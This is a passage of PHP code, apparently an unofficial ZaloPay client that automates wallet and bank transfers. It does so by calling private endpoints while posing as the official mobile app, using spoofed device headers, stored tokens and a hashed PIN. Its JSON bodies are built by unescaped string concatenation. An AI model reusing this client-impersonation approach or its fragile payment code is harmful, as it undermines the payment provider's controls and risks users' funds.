            'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Zalo iOS/502 ZaloTheme/light ZaloLanguage/vn',
            'Accept-Language: vi-VN,vi;q=0.9',
            'Referer: https://social.zalopay.vn/',
            'Connection: close',
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://graph.zalo.me/v2.0/ottoken?access_token=' . urlencode($zalo_access_token));
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $data = curl_exec($ch);
        $json = json_decode($data, true);
        curl_close($ch);
        return $json;
    }

    public function Order_Remoney($info, $msg, $amount = 0, $token = "")
    {
        $data = array(
            "receiver_user_id" => "",
            "receiver_zalo_id" => $info['data']['sender']['zalo_id'],
            "receiver_name" => $info['data']['sender']['display_name'],
            "receiver_avatar" => $info['data']['sender']['avatar'],
            "amount" => $amount,
            "note" => $msg,
            "zalo_token" => $token,
            "media" => array(
                "greeting_card" => array(
                    "theme_id" => "1",
                ),
            ),
        );
        $headers = array(
            'Host: sapi.zalopay.vn',
            'X-Zalopay-Id: ' . $this->config['user_id'],
            'user-agent: ' . $_SERVER['HTTP_USER_AGENT'] . ' ZaloPay Android / 9464',
            'X-Device-Model: iPhone11,6',
            'X-Access-Token: ' . $this->config['access_token'],
            'X-Device-Id: ' . $this->config['deviceid'],
            'X-Device-Os: IOS',
            'X-Os-Version: 16.3',
            'X-Density: iphone3x',
            'X-App-Version: 8.2.1',
            'X-Platform: ZPA,iOS',
            'X-Zalo-Id: ' . $this->config['zalo_id'],
            'Authorization: Bearer ' . $this->config['access_token'],
            'Accept-Language: vi-VN;q=1.0',
            'Sessionid: ' . $this->config['access_token'],
            'Accept: */*',
        );
        return $this->CURL('https://sapi.zalopay.vn/mt/v5/create-order-v2', $headers, $data);
    }

    public function ResendMoney($trans_id, $msg, $amount)
    {
        // get info
        $info = $this->getOrderInfo($trans_id);
        // print_r($info); die;
        if (empty($info['data']['order_no'])) {
            return array(
                'status' => 'error',
                'type' => 'info',
                'message' => 'Mã Chuyển Giao Dịch Lỗi',
            );
        }
        // order
        $result = $this->Order_ReMoney($info, $msg, $amount);
        if (empty($result)) {
            return array(
                'status' => 'error',
                'message' => 'Lỗi Dữ Liệu Chuyển Tiền',
            );
        }
        if (empty($result['data'])) {
            // print_r($result);
            return array(
                'status' => 'error',
                'message' => $result['error']['details']['localized_message']['message'],
            );
        }
        // get dữ liệu chuyển tiền
        $result2 = $this->Get_assets($result);
        if (empty($result2) || empty($result['data'])) {
            return array(
                'status' => 'error',
                'message' => 'Không Thể Lấy Thông Tin Chuyển Tiền',
            );
        }
        $sof_token = $result2['data']['source_of_fund']['sof_token'];
        $message = $result2['data']['source_of_fund']['message'];
        $balance = $result2['data']['source_of_fund']['balance'];
        // check số dư
        if ($balance < $amount) {
            return array(
                'status' => 'error',
                'message' => 'Số Dư Không Đủ',
            );
        }
        // chuyển tiền
        $send = $this->Pay_Money($result2);
        if (empty($send)) {
            return array(
                'status' => 'error',
                'message' => 'Không Thể Chuyển Tiền',
            );
        }
        if (isset($send['data']) && $send['data']['is_processing'] == 1) {
            // get mã giao dịch
            for ($i = 0; $i < 50; $i++) {
                $status_gd = $this->Status_send_money($send);
                if (!empty($status_gd['error'])) {
                    if ($status_gd['error']['code'] == 9) {
                        return array(
                            'status' => 'error',
                            'type' => 'max',
                            'message' => $status_gd['error']['details']['localized_message']['message'],
                        );
                    } else {
                        return array(
                            'status' => 'error',
                            'type' => 'error',
                            'message' => $status_gd['error']['details']['localized_message']['message'],
                        );
                    }
                } else if ($status_gd['data']['order_status'] != 2) {
                    break;
                }
            }

            if ($status_gd['data']['order_status'] == 7 || !empty($status_gd['data']['zp_trans_id'])) {
                $check_status = $this->GET_TRANS_BY_TID($status_gd['data']['zp_trans_id']);
                if (empty($check_status['error'])) {
                    $data_check = $check_status["data"]['transaction'];
                    if ($data_check['status_info']['status'] == 3) {
                        $title = $data_check['status_info']['title'];
                        $message = $data_check['status_info']['message'];
                        return array(
                            'status' => 'error',
                            'type' => 'max',
                            'message' => $message,
                        );
                    }
                }
                return array(
                    'status' => 'success',
                    'message' => 'Chuyển Tiền Thành Công',
                    'data' => array(
                        'zp_trans_id' => $status_gd['data']['zp_trans_id'],
                        'partner_phone' => $info['data']['sender']['phone'],
                        'partner_name' => $info['data']['sender']['display_name'],
                        'partner_id' => $info['data']['sender']['user_id'],
                        'avatar' => $info['data']['sender']['avatar'],
                        'amount' => $amount,
                        'comment' => $msg,
                        'owner_phone' => $this->config['phone'],
                        'owner_name' => $this->config['name'],
                        'order_token' => $send['data']['order_token'],
                    ),
                );
            } else {
                return array(
                    'status' => 'error',
                    'type' => 'error',
                    'message' => 'Lỗi Không Xác Định',
                );
            }
        } else {
            return array(
                'status' => 'error',
                'type' => 'error',
                'message' => 'Chuyển Tiền Thất Bại',
            );
        }
    }

    public function Reward($info, $msg, $amount)
    {
        // get zalo_access_token
        // $zalo_access_token = $this->zalo_access_token($info['data']['order_no']);
        // get ottoken
        // $ottoken = $this->ottoken($zalo_access_token['data']['zalo_access_token']);
        // order
        $result = $this->Order_ReMoney($info, $msg, $amount);
        if (empty($result)) {
            return array(
                'status' => 'error',
                'type' => 'error',
                'message' => 'Lỗi Dữ Liệu Chuyển Tiền',
            );
        }
        if (empty($result['data'])) {
            return array(
                'status' => 'error',
                'type' => 'error',
                'message' => $result['error']['details']['localized_message']['message'],
            );
        }
        // get dữ liệu chuyển tiền
        $result2 = $this->Get_assets($result);
        if (empty($result2) || empty($result['data'])) {
            return array(
                'status' => 'error',
                'type' => 'error',
                'message' => 'Không Thể Lấy Thông Tin Chuyển Tiền',
            );
        }
        $sof_token = $result2['data']['source_of_fund']['sof_token'];
        $message = $result2['data']['source_of_fund']['message'];
        $balance = $result2['data']['source_of_fund']['balance'];
        // check số dư
        if ($balance < $amount) {
            return array(
                'status' => 'error',
                'type' => 'money',
                'message' => 'Số Dư Không Đủ',
            );
        }
        // chuyển tiền
        $send = $this->Pay_Money($result2);
        if (empty($send)) {
            return array(
                'status' => 'error',
                'type' => 'error',
                'message' => 'Không Thể Chuyển Tiền',
            );
        }
        if (isset($send['data']) && $send['data']['is_processing'] == 1) {
            // get mã giao dịch
            for ($i = 0; $i < 50; $i++) {
                $status_gd = $this->Status_send_money($send);
                if (!empty($status_gd['error'])) {
                    if ($status_gd['error']['code'] == 9) {
                        return array(
                            'status' => 'error',
                            'type' => 'max',
                            'message' => $status_gd['error']['details']['localized_message']['message'],
                        );
                    } else {
                        return array(
                            'status' => 'error',
                            'type' => 'error',
                            'message' => $status_gd['error']['details']['localized_message']['message'],
                        );
                    }
                } else if ($status_gd['data']['order_status'] != 2) {
                    break;
                }
            }

            if ($status_gd['data']['order_status'] == 7 || !empty($status_gd['data']['zp_trans_id'])) {
                $check_status = $this->GET_TRANS_BY_TID($status_gd['data']['zp_trans_id']);
                if (empty($check_status['error'])) {
                    $data_check = $check_status["data"]['transaction'];
                    if ($data_check['status_info']['status'] == 3) {
                        $title = $data_check['status_info']['title'];
                        $message = $data_check['status_info']['message'];
                        return array(
                            'status' => 'error',
                            'type' => 'max',
                            'message' => $message,
                        );
                    }
                }
                return array(
                    'status' => 'success',
                    'message' => 'Chuyển Tiền Thành Công',
                    'data' => array(
                        'zp_trans_id' => $status_gd['data']['zp_trans_id'],
                        'partner_phone' => $info['data']['sender']['phone'],
                        'partner_name' => $info['data']['sender']['display_name'],
                        'partner_id' => $info['data']['sender']['user_id'],
                        'avatar' => $info['data']['sender']['avatar'],
                        'amount' => $amount,
                        'comment' => $msg,
                        'owner_phone' => $this->config['phone'],
                        'owner_name' => $this->config['name'],
                        'order_token' => $send['data']['order_token'],
                    ),
                );

            } else {
                return array(
                    'status' => 'error',
                    'type' => 'error',
                    'message' => 'Lỗi Không Xác Định',
                );
            }
        } else {
            return array(
                'status' => 'error',
                'type' => 'error',
                'message' => 'Chuyển Tiền Thất Bại',
            );
        }
    }

    // =========================[ Reward Web ]==========================================

    public function Order_Remoney_web($info, $msg, $amount = 0, $token = "")
    {
        $data = array(
            "receiver_user_id" => "",
            "receiver_zalo_id" => $info['data']['sender']['zalo_id'],
            "receiver_name" => $info['data']['sender']['display_name'],
            "receiver_avatar" => $info['data']['sender']['avatar'],
            "amount" => $amount,
            "note" => $msg,
            "zalo_token" => $token,
            "media" => array(
                "greeting_card" => array(
                    "theme_id" => "1",
                ),
            ),
        );
        $headers = array(
            'Host: sapi.zalopay.vn',
            'Cookie: ' . $this->config['cookie'],
            'Accept: */*',
            'Origin: https://social.zalopay.vn',
            'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/8.6.0 OS/16.0.2 Platform/ios Secured/true  ZaloPayWebClient/8.6.0',
            'Accept-Language: vi-VN,vi;q=0.9',
        );
        return $this->CURL('https://sapi.zalopay.vn/mt/v5/create-order-v2', $headers, $data);
    }

    public function ResendMoney_web($app_trans_id_resend, $msg, $amount)
    {
        // get info
        $info = $this->getOrderInfo_web($app_trans_id_resend);
        // if (empty($info['data']['order_no'])) {
        //     return array(
        //         'status' => 'error',
        //         'type' => 'info',
        //         'message' => 'Mã Chuyển Giao Dịch Lỗi',
        //     );
        // }
        // check info
        if (!empty($info['error'])) {
            return array(
                'status' => 'error',
                'type' => 'error',
                'message' => $info['error']['details']['localized_message']['message'],
            );
        }
        // order
        $result = $this->Order_Remoney_web($info, $msg, $amount);
        $order_no = $result['data']['order_no'];
        if (empty($result)) {
            return array(
                'status' => 'error',
                'type' => 'error',
                'message' => 'Lỗi Dữ Liệu Chuyển Tiền',
            );
        }
        if (empty($result['data'])) {
            return array(
                'status' => 'error',
                'type' => 'error',
                'message' => $result['error']['details']['localized_message']['message'],
            );
        }
        // get dữ liệu chuyển tiền
        $result2 = $this->Get_assets_web($result);
        if (empty($result2) || empty($result['data'])) {
            return array(
                'status' => 'error',
                'type' => 'error',
                'message' => 'Không Thể Lấy Thông Tin Chuyển Tiền',
            );
        }
        $sof_token = $result2['data']['source_of_fund']['sof_token'];
        $message = $result2['data']['source_of_fund']['message'];
        $balance = $result2['data']['source_of_fund']['balance'];
        // check số dư
        if ($balance < $amount) {
            return array(
                'status' => 'error',
                'type' => 'money',
                'message' => 'Số Dư Không Đủ',
            );
        }
        // chuyển tiền
        $send = $this->Pay_Money_web($result2);
        if (empty($send)) {
            return array(
                'status' => 'error',
                'type' => 'error',
                'message' => 'Không Thể Chuyển Tiền',
            );
        }
        if (isset($send['data']) && $send['data']['is_processing'] == 1) {
            for ($i = 0; $i < 20; $i++) {
                $get_trans_id = $this->getHistoryV2(1, '');
                $check_status = $this->GET_TRANS_BY_TID_WEB(json_decode($get_trans_id, true)["data"]['transactions'][0]['trans_id']);
                if ($check_status['data']['transaction']['app_trans_id'] == $order_no) {
                    break;
                }
            }
            // check max gd
            if (empty($check_status['error'])) {
                $data_check = $check_status["data"]['transaction'];
                if ($data_check['status_info']['status'] == 3) {
                    $title = $data_check['status_info']['title'];
                    $message = $data_check['status_info']['message'];
                    return array(
                        'status' => 'error',
                        'type' => 'max',
                        'message' => $message,
                    );
                }
            }
            return array(
                'status' => 'success',
                'message' => 'Chuyển Tiền Thành Công',
                'data' => array(
                    'trans_id' => $check_status["data"]['transaction']['trans_id'],
                    'zp_trans_id' => $check_status['data']['transaction']['app_trans_id'],
                    'partner_phone' => $info['data']['sender']['phone'],
                    'partner_name' => $info['data']['sender']['display_name'],
                    'partner_id' => $info['data']['sender']['user_id'],
                    'avatar' => $info['data']['sender']['avatar'],
                    'amount' => $amount,
                    'comment' => $msg,
                    'owner_phone' => $this->config['phone'],
                    'owner_name' => $this->config['name'],
                    'order_token' => $send['data']['order_token'],
                ),
            );
        } else {
            return array(
                'status' => 'error',
                'type' => 'error',
                'message' => 'Chuyển Tiền Thất Bại',
            );
        }
    }

    public function Reward_web($info, $msg, $amount)
    {
        // check info
        if (!empty($info['error'])) {
            return array(
                'status' => 'error',
                'type' => 'error',
                'message' => $info['error']['details']['localized_message']['message'],
            );
        }
        // order
        $result = $this->Order_Remoney_web($info, $msg, $amount);
        $order_no = $result['data']['order_no'];
        if (empty($result)) {
            return array(
                'status' => 'error',
                'type' => 'error',
                'message' => 'Lỗi Dữ Liệu Chuyển Tiền',
            );
        }
        if (empty($result['data'])) {
            return array(
                'status' => 'error',
                'type' => 'error',
                'message' => $result['error']['details']['localized_message']['message'],
            );
        }
        // get dữ liệu chuyển tiền
        $result2 = $this->Get_assets_web($result);
        if (empty($result2) || empty($result['data'])) {
            return array(
                'status' => 'error',
                'type' => 'error',
                'message' => 'Không Thể Lấy Thông Tin Chuyển Tiền',
            );
        }
        $sof_token = $result2['data']['source_of_fund']['sof_token'];
        $message = $result2['data']['source_of_fund']['message'];
        $balance = $result2['data']['source_of_fund']['balance'];
        // check số dư
        if ($balance < $amount) {
            return array(
                'status' => 'error',
                'type' => 'money',
                'message' => 'Lỗi Thánh Toán Liên Hệ Admin',
            );
        }
        // chuyển tiền
        $send = $this->Pay_Money_web($result2);
        if (empty($send)) {
            return array(
                'status' => 'error',
                'type' => 'error',
                'message' => 'Không Thể Chuyển Tiền',
            );
        }
        if (isset($send['data']) && $send['data']['is_processing'] == 1) {
            for ($i = 0; $i < 20; $i++) {
                $get_trans_id = $this->getHistoryV2(1, '');
                $check_status = $this->GET_TRANS_BY_TID_WEB(json_decode($get_trans_id, true)["data"]['transactions'][0]['trans_id']);
                if ($check_status['data']['transaction']['app_trans_id'] == $order_no) {
                    break;
                }
            }
            // check max gd
            if (empty($check_status['error'])) {
                $data_check = $check_status["data"]['transaction'];
                if ($data_check['status_info']['status'] == 3) {
                    $title = $data_check['status_info']['title'];
                    $message = $data_check['status_info']['message'];
                    return array(
                        'status' => 'error',
                        'type' => 'max',
                        'message' => $message,
                    );
                }
            }
            return array(
                'status' => 'success',
                'message' => 'Chuyển Tiền Thành Công',
                'data' => array(
                    'trans_id' => $check_status["data"]['transaction']['trans_id'],
                    'zp_trans_id' => $check_status['data']['transaction']['app_trans_id'],
                    'partner_phone' => $info['data']['sender']['phone'],
                    'partner_name' => $info['data']['sender']['display_name'],
                    'partner_id' => $info['data']['sender']['user_id'],
                    'avatar' => $info['data']['sender']['avatar'],
                    'amount' => $amount,
                    'comment' => $msg,
                    'owner_phone' => $this->config['phone'],
                    'owner_name' => $this->config['name'],
                    'order_token' => $send['data']['order_token'],
                ),
            );
        } else {
            return array(
                'status' => 'error',
                'type' => 'error',
                'message' => 'Chuyển Tiền Thất Bại',
            );
        }
    }
    // =================[ Chuyển Tiền Đến Ngân Hàng ]===================================
    public function listbankaccountforclient()
    {
        $curl = curl_init();
        curl_setopt_array($curl, array(
            CURLOPT_URL => 'https://bim.zalopay.vn/oss-bm/listbankaccountforclient?userid=' . $this->config['user_id'] . '&accesstoken=' . urlencode($this->config['access_token']) . '&bankaccountchecksum=&appversion=7.10.0&platform=android&deviceid=' . $this->config['deviceid'] . '&devicemodel=iPhone11,6&osver=16.3.1&appversion=7.10.0&sdkver=2.0.0&distsrc=&mno=&conntype=WIFI&issecure=true%20',
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_ENCODING => '',
            CURLOPT_MAXREDIRS => 10,
            CURLOPT_TIMEOUT => 0,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            CURLOPT_CUSTOMREQUEST => 'GET',
        ));
        $response = curl_exec($curl);
        return json_decode($response, true);
    }

    public function getlistmerchantuserinfo()
    {
        $headers = array(
            'Host: zalopay.com.vn',
            'Cookie: ' . $this->config['cookie'],
            'Accept: */*',
            'Origin: https://social.zalopay.vn',
            'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Zalo iOS/502 ZaloTheme/light ZaloLanguage/vn',
            'Accept-Language: vi-VN,vi;q=0.9',
        );
        // print_r($headers);
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://zalopay.com.vn/ummerchant/getlistmerchantuserinfo?appidlist=241&userid=' . urlencode($this->config['user_id']) . '&platform=android&deviceid=102b7763c7121dba&devicemodel=Samsung%20SM-G610F&osver=Android%2027%20%25288.1.0%2529&appversion=7.10.0&sdkver=2.0.0&distsrc=&mno=VN%20VINAPHONE&conntype=WIFI&issecure=true%20HTTP/1.1');
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $data = curl_exec($ch);
        // echo $data;
        $json = json_decode($data, true);
        curl_close($ch);
        return $json;
    }

    public function bank_mapping()
    {
        $headers = array(
            'Host: sapi.zalopay.vn',
            'Accept: */*',
            ' X-Drsite: off',
            'User-Agent: ZaloPay/8.4.0 (iPhone; iOS 16.3.1; Scale/3.00)',
            'Accept-Language: vi-VN;q=1',
            'Authorization: Bearer ' . $this->config['access_token'],
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://sapi.zalopay.vn/v2.1/bank-mapping/web/cc-bin-list?accesstoken=' . urlencode($this->config['access_token']) . '&appversion=8.4.0&conntype=unknown&deviceid=' . urlencode($this->config['deviceid']) . '&devicemodel=iPhone11%2C6&frontendid=1&issecure=true&osver=16.3.1&platform=ios&sessionid=' . urlencode($this->config['session_id']) . '&userid=' . urlencode($this->config['user_id']));
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $data = curl_exec($ch);
        echo $data;
        $json = json_decode($data, true);
        curl_close($ch);
        return $json;
    }
    public function get_app_config()
    {
        $headers = array(
            'Host: zalopay.com.vn',
            'X-Zalopay-Id: ' . $this->config['user_id'],
            'X-Drsite: off',
            'user-agent: ' . $_SERVER['HTTP_USER_AGENT'] . ' ZaloPayWebClient/8.3.0',
            'X-Device-Model: iPhone11,6',
            'X-Access-Token: ' . $this->config['access_token'],
            'X-Device-Id: ' . $this->config['deviceid'],
            'X-Device-Os: IOS',
            'X-Os-Version: 16.3.1',
            'X-Density: iphone3x',
            'X-App-Version: 8.4.0',
            'X-Platform: ZPA,iOS',
            'X-Zalo-Id: ' . $this->config['zalo_id'],
            'Authorization: Bearer ' . $this->config['access_token'],
            'Accept-Language: vi-VN,vi;q=0.9',
            'Sessionid: ' . $this->config['session_id'],
            'Accept: */*',
            'Content-Type: application/json',
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://zalopay.com.vn/ibft-client/app/get-app-config?maccesstoken=' . urlencode($this->config['maccesstoken']) . '&mappuser=' . urlencode($this->config['mappuser']));
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $data = curl_exec($ch);
        $json = json_decode($data, true);
        curl_close($ch);
        return $json;
    }

    public function get_name_bank($stk, $bankcode)
    {
        $headers = array(
            'Host: bim.zalopay.vn',
            'X-Zalopay-Id: ',
            'X-Drsite: off',
            'User-Agent: ZaloPay/8.6.0 (vn.com.vng.zalopay; build:700842; iOS 16.0.2) Alamofire/5.2.2',
            'X-User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/8.6.0 OS/16.0.2 Platform/ios Secured/true  ZaloPayWebClient/8.6.0',
            'X-Device-Model: iPhone14,3',
            'X-Access-Token: ',
            'X-Device-Id: ' . $this->config['deviceid'],
            'X-Device-Os: IOS',
            'X-Os-Version: 16.0.2',
            'X-Density: iphone3x',
            'X-App-Version: 8.6.0',
            'X-Platform: ZPA,iOS',
            'X-Zalo-Id: ' . $this->config['zalo_id'],
            'Authorization: Bearer ',
            'Accept-Language: vi-VN;q=1.0',
            'Sessionid: ',
            'Accept: */*',
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://bim.zalopay.vn/cpspaymentswitch/ibftappv2/getaccountinfo?bankcode=' . urlencode($bankcode) . '&maccesstoken=' . urlencode($this->config['maccesstoken']) . '&mappuser=' . urlencode($this->config['mappuser']) . '&number=' . urlencode($stk) . '&type=2&zaloPayID=' . urlencode($this->config['user_id']));
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $data = curl_exec($ch);
        $json = json_decode($data, true);
        curl_close($ch);
        return $json;
    }

    public function createorder_send_bank($stk, $config_bank, $data, $amount, $description, $item)
    {
        $bankname = $config_bank['name'];
        $banknames = $config_bank['fullname'];
        $bankcode = $config_bank['bankcode'];
        $bcbankcode = $config_bank['bcbankcode'];
        $numberBank4 = substr($stk, -4);
        $first6 = substr($stk, 0, 6);
        $curl = curl_init();
        curl_setopt_array($curl, array(
            CURLOPT_URL => 'https://bim.zalopay.vn/cpspaymentswitch/ibftappv2/createorder',
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_ENCODING => '',
            CURLOPT_MAXREDIRS => 10,
            CURLOPT_TIMEOUT => 0,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            CURLOPT_CUSTOMREQUEST => 'GET',
            CURLOPT_POSTFIELDS => '{
                "zaloPayID": "' . $this->config['user_id'] . '",
                "description": "' . $description . '",
                "number": "' . $stk . '",
                "type": 2,
                "transtype": 1,
                "save": "false",
                "amount": ' . $amount . ',
                "issuername": "' . $bankname . '",
                "bankcode": "' . $bcbankcode . '",
                "accountfullname": "' . $data['data']['fullName'] . '",
                "item": "{\\"ibfttype\\":2,\\"ibfttranstype\\":1,\\"ext\\":\\"Người nhận:' . $data['data']['fullName'] . '\\\\tNgân hàng:' . $bankname . '\\\\tSố tài khoản:**** ' . $numberBank4 . '\\",\\"number\\":\\"\\",\\"bcbankcode\\":\\"' . $bcbankcode . '\\",\\"bimid\\":\\"' . $data['data']['bimid'] . '\\",\\"bimtoken\\":\\"' . $data['data']['bimtoken'] . '\\",\\"first6no\\":\\"' . substr($stk, 0, 6) . '\\",\\"last4no\\":\\"' . $numberBank4 . '\\"}",
                "kyclevel": "3",
                "bimid": "' . $data['data']['bimid'] . '",
                "bimtoken": "' . $data['data']['bimtoken'] . '",
                "inquirytransid": "{\\"inquiryTransID\\":\\"' . json_decode($data['data']['inquirytransid'])->inquiryTransID . '\\",\\"bcBankConnCode\\":\\"' . json_decode($data['data']['inquirytransid'])->bcBankConnCode . '\\"}",
                "productcode": "TF007",
                "mappuser": "' . $this->config['mappuser'] . '",
                "maccesstoken": "' . $this->config['maccesstoken'] . '",
                "issecure": "true",
                "conntype": "WIFI",
                "sdkver": "2.0.0",
                "distsrc": "",
                "appversion": "7.10.0",
                "deviceid": "102b7763c7121dba",
                "osver": "Android 27 (8.1.0)",
                "platform": "android",
                "devicemodel": "Samsung SM-G610F",
                "mno": "VN VINAPHONE"
                        }',
            CURLOPT_HTTPHEADER => array(
                'Host: bim.zalopay.vn',
                'content-type: application/json; charset=UTF-8',
                'user-agent: okhttp/4.9.1',
            ),
        ));

        $response = curl_exec($curl);
        curl_close($curl);
        return json_decode($response, true);
    }

    public function precheck()
    {
        $curl = curl_init();

        curl_setopt_array($curl, array(
            CURLOPT_URL => 'api.zalopay.vn/v2/cashier/pre-check',
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_ENCODING => '',
            CURLOPT_MAXREDIRS => 10,
            CURLOPT_TIMEOUT => 0,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            CURLOPT_CUSTOMREQUEST => 'GET',
            CURLOPT_HTTPHEADER => array(
                'x-user-id:  ' . $this->config['user_id'] . '',
                'x-zalopay-id:  ' . $this->config['user_id'] . '',
                'x-access-token: ' . $this->config['access_token'] . '',
                'Authorization:  Bearer ' . $this->config['access_token'] . '',
                'User-Agent:  Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-G610F Build/M1AJQ)',
                'x-device-id:  102b7763c7121dba',
                'x-platform:  ZPA',
                'x-device-os:  ANDROID',
                'x-app-version:  7.10.0',
                'x-density:  xxhdpi',
                'Host:  api.zalopay.vn',
                'Connection:  Keep-Alive',
                'Accept-Encoding:  gzip',
                'If-Modified-Since:  Sun, 22 May 2022 05:31:23 GMT',
            ),
        ));

        $response = curl_exec($curl);
        curl_close($curl);

    }

    public function assets_bank($order)
    {
        $appid = $order['data']['appid'];
        $appuser = $order['data']['appuser'];
        $apptime = $order['data']['apptime'];
        $amount = $order['data']['amount'];
        $apptransid = $order['data']['apptransid'];
        $embeddata = $order['data']['embeddata'];
        $item = $order['data']['item'];
        $mac = $order['data']['mac'];
        $feeamount = $order['data']['feeamount'];
        $description = $order['data']['description'];
        $headers = array(
            'x-user-id:  ' . $this->config['user_id'] . '',
            'x-zalopay-id:  ' . $this->config['user_id'] . '',
            'x-access-token: ' . $this->config['access_token'] . '',
            'Authorization:  Bearer ' . $this->config['access_token'] . '',
            'User-Agent:  Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-G610F Build/M1AJQ)',
            'x-device-id:  102b7763c7121dba',
            'x-platform:  ZPA',
            'x-device-os:  ANDROID',
            'x-app-version:  7.10.0',
            'x-density:  xxhdpi',
            'Content-Type: application/json, charset=UTF-8',
        );

        $curl = curl_init();
        curl_setopt_array($curl, array(
            CURLOPT_URL => 'https://api.zalopay.vn/v2/cashier/assets',
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_ENCODING => '',
            CURLOPT_MAXREDIRS => 10,
            CURLOPT_TIMEOUT => 0,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            CURLOPT_CUSTOMREQUEST => 'POST',
            CURLOPT_POSTFIELDS => '{
  "order_type": "FULL_ORDER",
  "full_assets": true,
  "order_data": {
    "app_id": ' . $appid . ',
    "app_trans_id": "' . $apptransid . '",
    "app_time": ' . $apptime . ',
    "app_user": "' . $appuser . '",
    "amount": ' . $amount . ',
    "item": ' . json_encode($item) . ',
    "description": "' . $description . '",
    "embed_data": ' . json_encode($embeddata) . ',
    "mac": "' . $mac . '",
    "trans_type": 1,
    "product_code": "TF007",
    "service_fee": {
      "fee_amount": ' . $feeamount . ',
      "total_free_trans": 0,
      "remain_free_trans": 0
    }
  },
  "token_data": {
    "trans_token": "",
    "app_id": ' . $appid . '
  },
  "campaign_code": "",
  "display_mode": 1
}',
            CURLOPT_HTTPHEADER => $headers,
        ));

        $response = curl_exec($curl);

        curl_close($curl);
        return json_decode($response, true);
    }

    public function pay_bank($assets)
    {
        $headers = array(
            'Host: api.zalopay.vn',
            'X-Zalopay-Id: ' . $this->config['user_id'],
            'X-Drsite: off',
            'User-Agent: ZaloPay/700842 CFNetwork/1390 Darwin/22.0.0',
            'X-User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/8.6.0 OS/16.0.2 Platform/ios Secured/true  ZaloPayWebClient/8.6.0',
            'X-Device-Model: iPhone14,3',
            'X-Access-Token: ' . $this->config['access_token'],
            'X-Device-Id: ' . $this->config['deviceid'],
            'X-Device-Os: IOS',
            'X-Os-Version: 16.0.2',
            'X-Density: iphone3x',
            'X-App-Version: 8.6.0',
            'X-Platform: ZPA',
            'X-Zalo-Id: ' . $this->config['zalo_id'],
            'Authorization: Bearer ' . $this->config['access_token'],
            'Accept-Language: vi-VN,vi;q=0.9',
            'Sessionid: ' . $this->config['session_id'],
            'Accept: */*',
            'Content-Type: application/x-www-form-urlencoded',
        );
        $data = array(
            "authenticator" => array(
                "pin" => hash("sha256", $this->config['password']),
                "authen_type" => 1,
            ),
            "promotion_token" => "",
            "issecure" => "true",
            "zalo_token" => $this->config['access_token'],
            "frontendid" => "1",
            "appversion" => "8.6.0",
            "order_token" => $assets['data']['order_token'],
            "osver" => "16.0.2",
            "order_source" => 0,
            "conntype" => "wifi",
            "accesstoken" => $this->config['access_token'],
            "sof_token" => $assets['data']['sources_of_fund'][0]['sof_token'],
            "deviceid" => $this->config['deviceid'],
            "userid" => $this->config['user_id'],
            "platform" => "ios",
            "sessionid" => "",
            "devicemodel" => "iPhone14,3",
        );
        return $this->CURL('https://api.zalopay.vn/v2/cashier/pay', $headers, $data);
    }

    public function SendMoney_Bank($stk, $amount, $description, $config_bank)
    {
        $get_name_bank = $this->get_name_bank($stk, $config_bank['bcbankcode']);
        if (empty($get_name_bank['data']) || $get_name_bank['returncode'] != 1) {
            return array(
                'status' => 'error',
                'message' => 'Số Tài Khoản Không Hợp Lệ',
            );
        }
        $numberBank = substr($stk, -4);
        $item = array(
            "bankReceiver" => $config_bank['name'],
            "nameReceiver" => $get_name_bank['data']['fullName'],
            "bankIconName" => $config_bank['bankcode'],
            "ext" => "Người nhận:" . $get_name_bank['data']['fullName'] . " Số Tài Khoản:" . $config_bank['name'] . ":**** " . $numberBank,
            "numberBank" => "**** " . $numberBank,
            "first6no" => substr($stk, 0, 6),
            "bimid" => $get_name_bank['data']['bimid'],
            "last4no" => $numberBank,
